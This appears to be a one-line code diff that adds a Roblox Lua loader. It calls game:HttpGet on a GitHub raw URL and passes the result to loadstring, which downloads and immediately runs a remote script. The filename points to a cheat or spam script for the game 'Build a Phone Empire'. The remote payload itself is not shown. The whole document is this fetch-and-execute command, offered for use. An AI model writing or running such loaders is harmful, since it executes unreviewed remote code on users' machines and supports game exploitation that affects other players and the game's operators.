@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/build-a-phone-empire-spam4-5jea51ychi9ukz.lua"))()
